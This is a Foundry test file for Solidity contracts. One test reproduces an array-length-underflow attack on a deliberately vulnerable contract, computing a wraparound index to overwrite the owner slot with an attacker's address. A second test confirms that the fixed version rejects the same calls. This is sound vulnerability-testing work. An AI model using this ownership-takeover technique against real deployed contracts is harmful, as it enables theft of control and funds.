// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {ArbitraryLocationWrite} from "../src/ArbitraryLocationWrite.sol";
import {ArbitraryLocationWriteFixed} from "../src/ArbitraryLocationWriteFixed.sol";

contract ArbitraryLocationWriteFixtureTest is Test {
    address internal attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
    }

    // `owner` is the second state variable -> storage slot 1.
    function _owner(address a) internal view returns (address) {
        return address(uint160(uint256(vm.load(a, bytes32(uint256(1))))));
    }

    // After the length underflow the array spans all of storage. The element at
    // index idx is stored at keccak256(abi.encode(uint256(0))) + idx; choosing
    // idx = 2**256 - keccak256(0) + 1 makes that wrap to slot 1 (owner).
    function _overflowIndex() internal pure returns (uint256) {
        uint256 base = uint256(keccak256(abi.encode(uint256(0))));
        return type(uint256).max - base + 2; // == 2**256 - base + 1
    }

    function test_fixtureReproduces() public {
        ArbitraryLocationWrite w = new ArbitraryLocationWrite();
        assertEq(_owner(address(w)), address(this), "owner is deployer");

        // always-true bound check + unguarded decrement -> length underflows to 2**256-1
        vm.prank(attacker);
        w.PopBonusCode();

        vm.prank(attacker);
        w.UpdateBonusCodeAt(_overflowIndex(), uint256(uint160(attacker)));

        assertEq(_owner(address(w)), attacker, "owner overwritten via array-length underflow");
    }

    function test_fixtureDoesNotReproduce() public {
        ArbitraryLocationWriteFixed w = new ArbitraryLocationWriteFixed();
        address before = _owner(address(w));
        assertEq(before, address(this));

        vm.prank(attacker);
        vm.expectRevert();
        w.PopBonusCode();

        vm.prank(attacker);
        vm.expectRevert();
        w.UpdateBonusCodeAt(_overflowIndex(), uint256(uint160(attacker)));

        assertEq(_owner(address(w)), before, "owner unchanged");
    }
}
